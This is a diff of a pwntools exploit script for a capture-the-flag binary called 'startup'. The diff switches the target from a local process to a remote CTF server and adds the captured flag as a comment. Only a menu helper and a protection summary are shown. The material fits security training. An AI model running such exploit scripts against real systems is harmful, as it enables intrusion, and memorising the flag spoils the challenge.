@@ -2,7 +2,8 @@ from pwn import *
 
 context.log_level = 'debug'
 e = ELF('./startup')
-p = process('./startup')
+# p = process('./startup')
+p = remote('bisc.lordofpwn.kr',19834)
 
 def add(name):
 	p.sendlineafter('select :','1')
@@ -77,3 +78,5 @@ Company Chunk -> investor number
     NX:       NX enabled
     PIE:      PIE enabled
 '''
+
+# bisc{Do_y0u_know_startup?}
